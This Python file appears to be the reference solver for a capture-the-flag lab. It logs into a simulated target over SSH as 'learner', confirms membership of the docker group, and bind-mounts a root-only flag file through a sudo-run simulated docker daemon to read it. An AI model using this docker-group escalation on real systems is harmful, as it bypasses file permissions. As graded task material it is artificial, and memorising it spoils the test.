"""Intended-path solver: group check, doc read, daemon-sim mount read."""

import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    host = parsed.hostname or "target"
    port = parsed.port or 22

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )

    def run(cmd: str, timeout: int = 20) -> str:
        _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
        out = stdout.read().decode(errors="replace")
        err = stderr.read().decode(errors="replace")
        return out + (f"\n[stderr] {err.strip()}" if err.strip() else "")

    try:
        identity = run("id")
        if "docker" not in identity:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="mount-and-read",
                        ok=False,
                        detail=f"learner not in docker group: {identity.strip()}",
                    )
                ]
            )
        manual = run("/usr/local/bin/dockersim help")
        listing = run("/usr/local/bin/dockersim ps")
        sync_root = None
        for token in listing.split():
            if token.startswith("HOSTSYNC="):
                sync_root = token.partition("=")[2]
        if sync_root is None:
            # fall back to the documented default from the API manual
            sync_root = "/hostsim/root" if "/hostsim" in manual else None
        if sync_root is None:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="mount-and-read",
                        ok=False,
                        detail=f"no HOSTSYNC label found in ps output: {listing[:200]}",
                    )
                ]
            )

        denied = run(f"cat {sync_root}/flag.txt")
        if "Permission denied" not in denied:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="mount-and-read",
                        ok=False,
                        detail=f"direct cat did not fail as expected: {denied[:200]}",
                    )
                ]
            )

        out = run(
            "sudo -n /usr/local/bin/dockersim run --image alpine "
            f"--mount src={sync_root}/flag.txt,dst=/mnt/flag.txt -- "
            "cat /mnt/flag.txt",
            timeout=30,
        )
    finally:
        client.close()

    flags = find_flags(out)
    captured = flags[0] if flags else None
    detail = (
        "docker-group sudo path used; daemon-sim read the mounted root-only file"
        if captured
        else f"daemon-sim did not yield the flag: {out[-300:]}"
    )
    return SolveResult(
        results=[
            TaskResult(
                task_id="mount-and-read", ok=captured is not None, captured=captured, detail=detail
            )
        ]
    )
